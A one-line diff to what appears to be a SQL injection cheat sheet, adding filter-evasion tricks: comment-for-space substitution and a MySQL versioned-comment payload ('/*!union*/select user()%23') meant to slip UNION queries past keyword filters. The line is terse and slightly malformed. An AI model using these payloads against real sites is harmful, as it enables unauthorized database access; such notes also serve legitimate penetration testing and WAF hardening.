@@ -1,1 +1,1 @@
-filter space: comment /**/
+filter space: comment /**/ or exp union select '/*!union*/select user()%23  ( /*!xxxx*/)
